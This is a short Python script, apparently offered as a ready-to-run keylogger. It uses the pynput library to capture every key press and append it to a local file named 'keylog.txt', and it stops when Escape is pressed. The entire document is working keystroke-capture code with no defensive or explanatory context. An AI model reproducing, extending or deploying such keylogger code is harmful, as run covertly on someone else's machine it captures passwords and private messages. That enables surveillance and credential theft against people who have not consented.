from pynput.keyboard import Key, Listener

# Path to the log file
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(LOG_FILE, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print(f"Error: {str(e)}")

def on_release(key):
    # Stop the listener if Escape key is pressed
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    start_keylogger()